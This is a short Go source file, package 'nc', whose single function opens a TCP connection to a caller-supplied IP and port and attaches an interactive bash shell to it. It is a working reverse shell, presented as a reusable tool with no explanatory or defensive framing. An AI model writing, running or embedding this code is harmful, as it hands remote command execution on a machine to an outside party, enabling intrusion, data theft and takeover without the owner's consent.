package nc

import (
	"log"
	"net"
	"os/exec"
)

func Nc_linux(ip, port string) {
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		return
	}
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	if err := cmd.Run(); err != nil {
		log.Fatalln("run error")
	}
}
